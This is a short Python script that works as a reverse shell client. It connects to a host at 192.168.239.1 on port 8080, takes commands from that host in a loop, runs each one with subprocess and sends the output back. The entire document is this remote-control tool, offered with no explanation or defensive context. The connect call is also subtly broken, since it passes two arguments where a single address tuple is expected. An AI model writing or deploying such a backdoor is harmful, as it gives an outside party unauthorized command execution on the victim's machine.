from socket import *

import subprocess

from colorama import Fore

conn = socket(2,1)

conn.connect('192.168.239.1',8080)

print(Fore.YELLOW + ' Connected ! ! ! ' + "\n")

while True:
    data = conn.recv(123456).decode()
    rsl = subprocess.getoutput(data)
    conn.send(rsl.encode())

conn.close()
